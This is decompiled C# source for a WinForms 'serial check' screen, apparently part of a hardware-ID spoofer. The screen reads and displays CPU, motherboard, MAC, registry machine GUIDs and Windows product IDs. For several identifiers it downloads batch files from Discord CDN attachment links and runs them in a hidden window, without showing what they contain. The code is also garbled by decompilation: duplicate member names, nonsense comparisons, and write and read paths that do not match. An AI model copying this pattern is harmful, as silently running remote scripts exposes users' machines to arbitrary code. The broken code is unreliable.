using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Siticone.UI.WinForms;

namespace SUPER
{
	public sealed class serialcheck : Form
	{
		[Serializable]
		[CompilerGenerated]
		private sealed class Class_33
		{
			public static readonly Class_33 dashboard;

			public static Func<ManagementObject, object> dashboard;

			public static Func<ManagementObject, string> dashboard = (Func<ManagementObject, string>)(object)new Class_33();

			internal object MainLoad(ManagementObject managementObject_0)
			{
				return managementObject_0["IPConnectionMetric"];
			}

			internal string MainLoad(ManagementObject managementObject_0)
			{
				return managementObject_0["MACAddress"].ToString();
			}
		}

		private static string dashboard;

		private static string green;

		private static string spooferfixes;

		private static string systemspoof;

		private IContainer dashboard = AssistantHelper.dashboard;

		private Label returncpu;

		private Label returnmb;

		private Label returnmac;

		private Label returnbios;

		private Label returnmem;

		private Label returnhdd;

		private SiticoneGroupBox siticoneGroupBox1;

		private SiticoneGroupBox siticoneGroupBox2;

		private SiticoneGroupBox siticoneGroupBox3;

		private SiticoneGroupBox siticoneGroupBox4;

		private SiticoneGroupBox siticoneGroupBox5;

		private SiticoneGroupBox siticoneGroupBox6;

		private SiticoneGroupBox siticoneGroupBox7;

		private Label pcnameres;

		private SiticoneGroupBox siticoneGroupBox8;

		private Label machid;

		private SiticoneGroupBox siticoneGroupBox10;

		private Label clientuuid;

		private SiticoneGroupBox siticoneGroupBox9;

		private Label profileguidr;

		private SiticoneGroupBox siticoneGroupBox13;

		private Label bgr;

		private SiticoneGroupBox siticoneGroupBox14;

		private Label drins;

		private SiticoneGroupBox siticoneGroupBox15;

		private Label buildlab;

		private SiticoneGroupBox siticoneGroupBox16;

		private Label datapr;

		private SiticoneGroupBox siticoneGroupBox17;

		private Label userguid;

		public serialcheck()
		{
			MainLoad();
		}

		private void serialcheckLoad(object sender, EventArgs param_354)
		{
			try
			{
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"C:\"");
				managementObject.Get();
				managementObject["VolumeSerialNumber"].ToString();
			}
			catch
			{
				try
				{
					ManagementObject managementObject2 = new ManagementObject("win32_logicaldisk.deviceid=\"D:\"");
					managementObject2.Get();
					managementObject2["VolumeSerialNumber"].ToString();
				}
				catch
				{
					lick.WriteAllText("disk.mising", "need C or D");
					Environment.Exit(0);
				}
			}
			try
			{
				ManagementObjectCollection managementObjectCollection = TreeNodeCollection.dashboard;
				foreach (ManagementObject item in new ManagementObjectSearcher("Select * From Win32_processor").Get())
				{
					serialcheck.dashboard = (IContainer)(object)item["ProcessorID"].ToString();
					systemspoof = ((string)(object)serialcheck.dashboard).Substring(((string)(object)serialcheck.dashboard).Length - 10);
				}
				returncpu.Text = systemspoof;
			}
			catch (Exception)
			{
				returncpu.Text = "No Instance Available (SPOOFED)";
			}
			try
			{
				foreach (ManagementObject item2 in new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard").Get())
				{
					green = (string)item2["SerialNumber"];
					spooferfixes = green.Substring(green.Length - 10);
				}
				returnmb.Text = green;
			}
			catch (Exception)
			{
				returnmb.Text = "No Instance Available (SPOOFED)";
			}
			try
			{
				string obj3 = (from ManagementObject managementObject_0 in new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration where IPEnabled=true").Get()
					orderby managementObject_0["IPConnectionMetric"]
					select managementObject_0["MACAddress"].ToString()).FirstOrDefault();
				returnmac.Text = obj3;
			}
			catch (Exception)
			{
				returnmac.Text = "No Instance Available (SPOOFED)";
			}
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/906641869461684234/biosuuid.bat", "C:\\Program Files\\Temp\\biosuuid.bat");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Program Files\\Temp\\biosuuid.bat";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				string[] array = lick.ReadAllLines("C:\\ProgramData\\Temp\\biosuuid.txt", Encoding.UTF8);
				foreach (string obj4 in array)
				{
					returnbios.Text = obj4;
				}
			}
			catch (Exception)
			{
				returnbios.Text = "No Instance Available (SPOOFED)";
			}
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/906645116855410748/memorychip.bat", "C:\\Program Files\\Temp\\memorychip.bat");
				Process process2 = new Process();
				process2.StartInfo.FileName = "C:\\Program Files\\Temp\\memorychip.bat";
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process2.Start();
				string[] array2 = lick.ReadAllLines("C:\\ProgramData\\Temp\\memorychip.txt", Encoding.UTF8);
				foreach (string obj5 in array2)
				{
					returnmem.Text = obj5;
				}
			}
			catch (Exception)
			{
				returnmem.Text = "No Instance Available (SPOOFED)";
			}
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/906645758084796499/diskdrive.bat", "C:\\Program Files\\Temp\\diskdrive.bat");
				Process process3 = new Process();
				process3.StartInfo.FileName = "C:\\Program Files\\Temp\\diskdrive.bat";
				process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process3.Start();
				string[] array3 = lick.ReadAllLines("C:\\ProgramData\\Temp\\diskdrive.txt", Encoding.UTF8);
				foreach (string obj6 in array3)
				{
					returnhdd.Text = obj6;
				}
			}
			catch (Exception)
			{
				returnhdd.Text = "No Instance Available (SPOOFED)";
			}
			try
			{
				pcnameres.Text = Dns.GetHostName();
			}
			catch (Exception)
			{
				pcnameres.Text = "No Instance Available (ERROR)";
			}
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001");
				if (registryKey > BitmapList.dashboard)
				{
					profileguidr.Text = (string)registryKey.GetValue("HwProfileGuid");
					registryKey.Close();
				}
			}
			catch (Exception)
			{
				profileguidr.Text = "No Instance Available (ERROR)";
			}
			try
			{
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography");
				if (registryKey2 > BitmapList.dashboard)
				{
					machid.Text = (string)registryKey2.GetValue("MachineGuid");
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
				machid.Text = "No Instance Available (ERROR)";
			}
			try
			{
				RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000");
				if (registryKey3 > BitmapList.dashboard)
				{
					userguid.Text = (string)registryKey3.GetValue("UserModeDriverGUID");
					registryKey3.Close();
				}
			}
			catch (Exception)
			{
				userguid.Text = "No Instance Available (ERROR)";
			}
			try
			{
				RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
				if (registryKey4 > BitmapList.dashboard)
				{
					bgr.Text = (string)registryKey4.GetValue("BuildGUID");
					registryKey4.Close();
				}
			}
			catch (Exception)
			{
				bgr.Text = "No Instance Available (ERROR)";
			}
			try
			{
				RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
				if (registryKey5 > BitmapList.dashboard)
				{
					buildlab.Text = (string)registryKey5.GetValue("BuildLab");
					registryKey5.Close();
				}
			}
			catch (Exception)
			{
				buildlab.Text = "No Instance Available (ERROR)";
			}
			try
			{
				RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000");
				if (registryKey6 > BitmapList.dashboard)
				{
					datapr.Text = (string)registryKey6.GetValue("_DriverProviderInfo");
					registryKey6.Close();
				}
			}
			catch (Exception)
			{
				datapr.Text = "No Instance Available (ERROR)";
			}
			try
			{
				RegistryKey registryKey7 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SystemInformation");
				if (registryKey7 > BitmapList.dashboard)
				{
					clientuuid.Text = (string)registryKey7.GetValue("ComputerHardwareId");
					registryKey7.Close();
				}
			}
			catch (Exception)
			{
				clientuuid.Text = "No Instance Available (ERROR)";
			}
			try
			{
				RegistryKey registryKey8 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
				if (registryKey8 > BitmapList.dashboard)
				{
					drins.Text = (string)registryKey8.GetValue("ProductId");
					registryKey8.Close();
				}
			}
			catch (Exception)
			{
				drins.Text = "No Instance Available (ERROR)";
			}
			if (returnmb.Text == "")
				returnmb.Text = "No Instance Available (SPOOFED)";
			if (returnmem.Text == "")
				returnmem.Text = "No Instance Available (SPOOFED)";
			if (returnhdd.Text == "")
				returnhdd.Text = "No Instance Available (SPOOFED)";
		}

		private void bsClick(object sender, EventArgs param_356)
		{
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/910988697002967102/918941063526355014/gpuuuid.bat", "C:\\Program Files\\Temp\\gpuuuid.bat");
				Process.Start("C:\\Program Files\\Temp\\gpuuuid.bat");
			}
			catch (Exception)
			{
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && dashboard > AssistantHelper.dashboard)
				dashboard.Dispose();
			base.Dispose(disposing);
		}

		private void MainLoad()
		{
			returncpu = new Label();
			returnmb = new Label();
			returnhdd = new Label();
			returnmac = new Label();
			returnbios = new Label();
			returnmem = new Label();
			siticoneGroupBox1 = new SiticoneGroupBox();
			siticoneGroupBox2 = new SiticoneGroupBox();
			siticoneGroupBox3 = new SiticoneGroupBox();
			siticoneGroupBox4 = new SiticoneGroupBox();
			siticoneGroupBox5 = new SiticoneGroupBox();
			siticoneGroupBox6 = new SiticoneGroupBox();
			siticoneGroupBox7 = new SiticoneGroupBox();
			pcnameres = new Label();
			siticoneGroupBox8 = new SiticoneGroupBox();
			machid = new Label();
			siticoneGroupBox10 = new SiticoneGroupBox();
			clientuuid = new Label();
			siticoneGroupBox9 = new SiticoneGroupBox();
			profileguidr = new Label();
			siticoneGroupBox13 = new SiticoneGroupBox();
			bgr = new Label();
			siticoneGroupBox14 = new SiticoneGroupBox();
			drins = new Label();
			siticoneGroupBox15 = new SiticoneGroupBox();
			buildlab = new Label();
			siticoneGroupBox16 = new SiticoneGroupBox();
			datapr = new Label();
			siticoneGroupBox17 = new SiticoneGroupBox();
			userguid = new Label();
			siticoneGroupBox1.SuspendLayout();
			siticoneGroupBox2.SuspendLayout();
			siticoneGroupBox3.SuspendLayout();
			siticoneGroupBox4.SuspendLayout();
			siticoneGroupBox5.SuspendLayout();
			siticoneGroupBox6.SuspendLayout();
			siticoneGroupBox7.SuspendLayout();
			siticoneGroupBox8.SuspendLayout();
			siticoneGroupBox10.SuspendLayout();
			siticoneGroupBox9.SuspendLayout();
			siticoneGroupBox13.SuspendLayout();
			siticoneGroupBox14.SuspendLayout();
			siticoneGroupBox15.SuspendLayout();
			siticoneGroupBox16.SuspendLayout();
			siticoneGroupBox17.SuspendLayout();
			SuspendLayout();
			returncpu.AutoSize = true;
			returncpu.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
			returncpu.ForeColor = Color.White;
			returncpu.Location = new Point(9, 44);
			returncpu.Name = "returncpu";
			returncpu.Size = new Size(70, 17);
			returncpu.TabIndex = 7;
			returncpu.Text = "Loading...";
			returnmb.AutoSize = true;
			returnmb.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			returnmb.ForeColor = Color.White;
			returnmb.Location = new Point(8, 44);
			returnmb.Name = "returnmb";
			returnmb.Size = new Size(70, 17);
			returnmb.TabIndex = 7;
			returnmb.Text = "Loading...";
			returnhdd.AutoSize = true;
			returnhdd.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			returnhdd.ForeColor = Color.White;
			returnhdd.Location = new Point(9, 44);
			returnhdd.Name = "returnhdd";
			returnhdd.Size = new Size(70, 17);
			returnhdd.TabIndex = 8;
			returnhdd.Text = "Loading...";
			returnmac.AutoSize = true;
			returnmac.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			returnmac.ForeColor = Color.White;
			returnmac.Location = new Point(9, 45);
			returnmac.Name = "returnmac";
			returnmac.Size = new Size(70, 17);
			returnmac.TabIndex = 7;
			returnmac.Text = "Loading...";
			returnbios.AutoSize = true;
			returnbios.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			returnbios.ForeColor = Color.White;
			returnbios.Location = new Point(9, 45);
			returnbios.Name = "returnbios";
			returnbios.Size = new Size(70, 17);
			returnbios.TabIndex = 7;
			returnbios.Text = "Loading...";
			returnmem.AutoSize = true;
			returnmem.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			returnmem.ForeColor = Color.White;
			returnmem.Location = new Point(8, 45);
			returnmem.Name = "returnmem";
			returnmem.Size = new Size(70, 17);
			returnmem.TabIndex = 7;
			returnmem.Text = "Loading...";
			siticoneGroupBox1.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox1.Controls.Add(returncpu);
			siticoneGroupBox1.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox1.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox1.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox1.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox1.Location = new Point(12, 6);
			siticoneGroupBox1.Name = "siticoneGroupBox1";
			siticoneGroupBox1.ShadowDecoration.Parent = siticoneGroupBox1;
			siticoneGroupBox1.Size = new Size(263, 85);
			siticoneGroupBox1.TabIndex = 98;
			siticoneGroupBox1.Text = "CPU ID:";
			siticoneGroupBox2.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox2.Controls.Add(returnmb);
			siticoneGroupBox2.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox2.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox2.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox2.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox2.Location = new Point(303, 6);
			siticoneGroupBox2.Name = "siticoneGroupBox2";
			siticoneGroupBox2.ShadowDecoration.Parent = siticoneGroupBox2;
			siticoneGroupBox2.Size = new Size(263, 85);
			siticoneGroupBox2.TabIndex = 99;
			siticoneGroupBox2.Text = "MOTHERBOARD ID:";
			siticoneGroupBox3.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox3.Controls.Add(returnhdd);
			siticoneGroupBox3.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox3.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox3.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox3.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox3.Location = new Point(588, 6);
			siticoneGroupBox3.Name = "siticoneGroupBox3";
			siticoneGroupBox3.ShadowDecoration.Parent = siticoneGroupBox3;
			siticoneGroupBox3.Size = new Size(263, 85);
			siticoneGroupBox3.TabIndex = 100;
			siticoneGroupBox3.Text = "DISKDRIVE ID:";
			siticoneGroupBox4.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox4.Controls.Add(returnmac);
			siticoneGroupBox4.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox4.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox4.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox4.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox4.Location = new Point(588, 313);
			siticoneGroupBox4.Name = "siticoneGroupBox4";
			siticoneGroupBox4.ShadowDecoration.Parent = siticoneGroupBox4;
			siticoneGroupBox4.Size = new Size(263, 85);
			siticoneGroupBox4.TabIndex = 99;
			siticoneGroupBox4.Text = "MAC ID:";
			siticoneGroupBox5.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox5.Controls.Add(returnmem);
			siticoneGroupBox5.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox5.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox5.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox5.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox5.Location = new Point(303, 107);
			siticoneGroupBox5.Name = "siticoneGroupBox5";
			siticoneGroupBox5.ShadowDecoration.Parent = siticoneGroupBox5;
			siticoneGroupBox5.Size = new Size(263, 85);
			siticoneGroupBox5.TabIndex = 100;
			siticoneGroupBox5.Text = "MEMORY ID:";
			siticoneGroupBox6.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox6.Controls.Add(returnbios);
			siticoneGroupBox6.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox6.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox6.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox6.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox6.Location = new Point(12, 414);
			siticoneGroupBox6.Name = "siticoneGroupBox6";
			siticoneGroupBox6.ShadowDecoration.Parent = siticoneGroupBox6;
			siticoneGroupBox6.Size = new Size(554, 85);
			siticoneGroupBox6.TabIndex = 100;
			siticoneGroupBox6.Text = "BIOS UUID:";
			siticoneGroupBox7.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox7.Controls.Add(pcnameres);
			siticoneGroupBox7.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox7.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox7.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox7.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox7.Location = new Point(12, 107);
			siticoneGroupBox7.Name = "siticoneGroupBox7";
			siticoneGroupBox7.ShadowDecoration.Parent = siticoneGroupBox7;
			siticoneGroupBox7.Size = new Size(263, 85);
			siticoneGroupBox7.TabIndex = 100;
			siticoneGroupBox7.Text = "PC NAME:";
			pcnameres.AutoSize = true;
			pcnameres.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			pcnameres.ForeColor = Color.White;
			pcnameres.Location = new Point(9, 45);
			pcnameres.Name = "pcnameres";
			pcnameres.Size = new Size(70, 17);
			pcnameres.TabIndex = 7;
			pcnameres.Text = "Loading...";
			siticoneGroupBox8.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox8.Controls.Add(machid);
			siticoneGroupBox8.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox8.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox8.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox8.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox8.Location = new Point(303, 210);
			siticoneGroupBox8.Name = "siticoneGroupBox8";
			siticoneGroupBox8.ShadowDecoration.Parent = siticoneGroupBox8;
			siticoneGroupBox8.Size = new Size(263, 85);
			siticoneGroupBox8.TabIndex = 101;
			siticoneGroupBox8.Text = "MACHINE ID:";
			machid.AutoSize = true;
			machid.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			machid.ForeColor = Color.White;
			machid.Location = new Point(9, 45);
			machid.Name = "machid";
			machid.Size = new Size(70, 17);
			machid.TabIndex = 7;
			machid.Text = "Loading...";
			siticoneGroupBox10.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox10.Controls.Add(clientuuid);
			siticoneGroupBox10.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox10.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox10.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox10.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox10.Location = new Point(12, 313);
			siticoneGroupBox10.Name = "siticoneGroupBox10";
			siticoneGroupBox10.ShadowDecoration.Parent = siticoneGroupBox10;
			siticoneGroupBox10.Size = new Size(554, 85);
			siticoneGroupBox10.TabIndex = 101;
			siticoneGroupBox10.Text = "Hardware ID";
			clientuuid.AutoSize = true;
			clientuuid.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			clientuuid.ForeColor = Color.White;
			clientuuid.Location = new Point(9, 45);
			clientuuid.Name = "clientuuid";
			clientuuid.Size = new Size(70, 17);
			clientuuid.TabIndex = 7;
			clientuuid.Text = "Loading...";
			siticoneGroupBox9.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox9.Controls.Add(profileguidr);
			siticoneGroupBox9.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox9.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox9.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox9.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox9.Location = new Point(588, 210);
			siticoneGroupBox9.Name = "siticoneGroupBox9";
			siticoneGroupBox9.ShadowDecoration.Parent = siticoneGroupBox9;
			siticoneGroupBox9.Size = new Size(263, 85);
			siticoneGroupBox9.TabIndex = 102;
			siticoneGroupBox9.Text = "PROFILE GUID:";
			profileguidr.AutoSize = true;
			profileguidr.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			profileguidr.ForeColor = Color.White;
			profileguidr.Location = new Point(9, 45);
			profileguidr.Name = "profileguidr";
			profileguidr.Size = new Size(70, 17);
			profileguidr.TabIndex = 7;
			profileguidr.Text = "Loading...";
			siticoneGroupBox13.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox13.Controls.Add(bgr);
			siticoneGroupBox13.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox13.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox13.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox13.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox13.Location = new Point(588, 107);
			siticoneGroupBox13.Name = "siticoneGroupBox13";
			siticoneGroupBox13.ShadowDecoration.Parent = siticoneGroupBox13;
			siticoneGroupBox13.Size = new Size(263, 85);
			siticoneGroupBox13.TabIndex = 103;
			siticoneGroupBox13.Text = "BUILD GUID:";
			bgr.AutoSize = true;
			bgr.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			bgr.ForeColor = Color.White;
			bgr.Location = new Point(9, 45);
			bgr.Name = "bgr";
			bgr.Size = new Size(70, 17);
			bgr.TabIndex = 7;
			bgr.Text = "Loading...";
			siticoneGroupBox14.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox14.Controls.Add(drins);
			siticoneGroupBox14.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox14.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox14.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox14.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox14.Location = new Point(588, 414);
			siticoneGroupBox14.Name = "siticoneGroupBox14";
			siticoneGroupBox14.ShadowDecoration.Parent = siticoneGroupBox14;
			siticoneGroupBox14.Size = new Size(263, 85);
			siticoneGroupBox14.TabIndex = 103;
			siticoneGroupBox14.Text = "PRODUCT ID:";
			drins.AutoSize = true;
			drins.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			drins.ForeColor = Color.White;
			drins.Location = new Point(9, 45);
			drins.Name = "drins";
			drins.Size = new Size(70, 17);
			drins.TabIndex = 7;
			drins.Text = "Loading...";
			siticoneGroupBox15.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox15.Controls.Add(buildlab);
			siticoneGroupBox15.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox15.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox15.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox15.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox15.Location = new Point(12, 210);
			siticoneGroupBox15.Name = "siticoneGroupBox15";
			siticoneGroupBox15.ShadowDecoration.Parent = siticoneGroupBox15;
			siticoneGroupBox15.Size = new Size(263, 85);
			siticoneGroupBox15.TabIndex = 104;
			siticoneGroupBox15.Text = "BUILD LAB: ";
			buildlab.AutoSize = true;
			buildlab.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			buildlab.ForeColor = Color.White;
			buildlab.Location = new Point(9, 45);
			buildlab.Name = "buildlab";
			buildlab.Size = new Size(70, 17);
			buildlab.TabIndex = 7;
			buildlab.Text = "Loading...";
			siticoneGroupBox16.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox16.Controls.Add(datapr);
			siticoneGroupBox16.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox16.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox16.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox16.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox16.Location = new Point(12, 511);
			siticoneGroupBox16.Name = "siticoneGroupBox16";
			siticoneGroupBox16.ShadowDecoration.Parent = siticoneGroupBox16;
			siticoneGroupBox16.Size = new Size(437, 85);
			siticoneGroupBox16.TabIndex = 104;
			siticoneGroupBox16.Text = "DRIVER PROVIDER ID:";
			datapr.AutoSize = true;
			datapr.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			datapr.ForeColor = Color.White;
			datapr.Location = new Point(9, 45);
			datapr.Name = "datapr";
			datapr.Size = new Size(70, 17);
			datapr.TabIndex = 7;
			datapr.Text = "Loading...";
			siticoneGroupBox17.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox17.Controls.Add(userguid);
			siticoneGroupBox17.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox17.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox17.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox17.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox17.Location = new Point(455, 511);
			siticoneGroupBox17.Name = "siticoneGroupBox17";
			siticoneGroupBox17.ShadowDecoration.Parent = siticoneGroupBox17;
			siticoneGroupBox17.Size = new Size(396, 85);
			siticoneGroupBox17.TabIndex = 105;
			siticoneGroupBox17.Text = "USERMODE GUID:";
			userguid.AutoSize = true;
			userguid.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
			userguid.ForeColor = Color.White;
			userguid.Location = new Point(9, 45);
			userguid.Name = "userguid";
			userguid.Size = new Size(70, 17);
			userguid.TabIndex = 7;
			userguid.Text = "Loading...";
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			BackColor = Color.FromArgb(25, 26, 30);
			base.ClientSize = new Size(873, 617);
			base.Controls.Add(siticoneGroupBox17);
			base.Controls.Add(siticoneGroupBox16);
			base.Controls.Add(siticoneGroupBox15);
			base.Controls.Add(siticoneGroupBox14);
			base.Controls.Add(siticoneGroupBox13);
			base.Controls.Add(siticoneGroupBox9);
			base.Controls.Add(siticoneGroupBox10);
			base.Controls.Add(siticoneGroupBox8);
			base.Controls.Add(siticoneGroupBox7);
			base.Controls.Add(siticoneGroupBox6);
			base.Controls.Add(siticoneGroupBox5);
			base.Controls.Add(siticoneGroupBox4);
			base.Controls.Add(siticoneGroupBox3);
			base.Controls.Add(siticoneGroupBox2);
			base.Controls.Add(siticoneGroupBox1);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Name = "serialcheck";
			Text = "s";
			base.Load += serialcheckLoad;
			siticoneGroupBox1.ResumeLayout(false);
			siticoneGroupBox1.PerformLayout();
			siticoneGroupBox2.ResumeLayout(false);
			siticoneGroupBox2.PerformLayout();
			siticoneGroupBox3.ResumeLayout(false);
			siticoneGroupBox3.PerformLayout();
			siticoneGroupBox4.ResumeLayout(false);
			siticoneGroupBox4.PerformLayout();
			siticoneGroupBox5.ResumeLayout(false);
			siticoneGroupBox5.PerformLayout();
			siticoneGroupBox6.ResumeLayout(false);
			siticoneGroupBox6.PerformLayout();
			siticoneGroupBox7.ResumeLayout(false);
			siticoneGroupBox7.PerformLayout();
			siticoneGroupBox8.ResumeLayout(false);
			siticoneGroupBox8.PerformLayout();
			siticoneGroupBox10.ResumeLayout(false);
			siticoneGroupBox10.PerformLayout();
			siticoneGroupBox9.ResumeLayout(false);
			siticoneGroupBox9.PerformLayout();
			siticoneGroupBox13.ResumeLayout(false);
			siticoneGroupBox13.PerformLayout();
			siticoneGroupBox14.ResumeLayout(false);
			siticoneGroupBox14.PerformLayout();
			siticoneGroupBox15.ResumeLayout(false);
			siticoneGroupBox15.PerformLayout();
			siticoneGroupBox16.ResumeLayout(false);
			siticoneGroupBox16.PerformLayout();
			siticoneGroupBox17.ResumeLayout(false);
			siticoneGroupBox17.PerformLayout();
			ResumeLayout(false);
		}
	}
}
